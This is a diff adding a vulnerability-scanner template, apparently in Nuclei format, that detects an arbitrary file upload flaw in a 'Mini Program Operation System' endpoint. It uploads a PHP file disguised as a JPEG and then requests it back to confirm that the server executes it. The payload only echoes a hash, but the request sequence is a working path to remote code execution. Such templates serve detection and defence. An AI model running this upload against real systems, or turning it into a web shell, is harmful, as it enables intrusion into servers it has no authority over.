@@ -1,0 +1,59 @@
+id: poc-yaml-mini-program-operation-system-wxupimg-anyfile-upload
+info:
+  name: "Mini Program Operation System wxupimg Arbitrary File Upload Vulnerability"
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+  dt_1: "{{date_time('2006')}}"
+  dt_2: "{{date_time('01')}}"
+  dt_3: "{{date_time('02')}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/api/wxapps/wxupimg"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryNGBhBIC624F4IANg"
+    body: |-
+      ------WebKitFormBoundaryNGBhBIC624F4IANg
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.php"
+      Content-Type: image/jpeg
+
+      <?php echo md5({{t1}});?>
+      ------WebKitFormBoundaryNGBhBIC624F4IANg--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "host"
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        group: 1
+        regex:
+          - "([a-z0-9]{9,40})\\.php"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/upimages/{{dt_1}}{{dt_2}}{{dt_3}}/{{file}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "body == t2"
